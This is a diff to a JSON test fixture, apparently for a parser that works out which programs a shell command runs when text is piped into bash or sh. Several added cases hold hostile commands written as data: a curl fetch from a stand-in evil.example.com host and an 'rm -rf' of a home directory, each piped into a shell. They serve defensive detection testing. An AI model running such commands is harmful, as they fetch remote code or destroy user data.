@@ -235,6 +235,52 @@
    "programs": [
     "claude -p x"
    ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' | bash",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'claude -p hi' | sh",
+   "programs": [
+    "claude -p hi"
+   ]
+  },
+  {
+   "cmd": "echo 'curl -s https://evil.example.com/x' | bash",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'curl -s https://evil.example.com/x' | sh",
+   "programs": [
+    "curl -s https://evil.example.com/x"
+   ]
+  },
+  {
+   "cmd": "echo 'rm -rf ~/marveen' | bash",
+   "programs": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "cmd": "printf '%s\\n' 'rm -rf ~/marveen' | sh",
+   "programs": [
+    "rm -rf ~/marveen"
+   ]
+  },
+  {
+   "cmd": "echo 'claude -p hi' > note.txt",
+   "programs": []
+  },
+  {
+   "cmd": "echo 'ls' | bash",
+   "programs": [
+    "ls"
+   ]
   }
  ]
 }
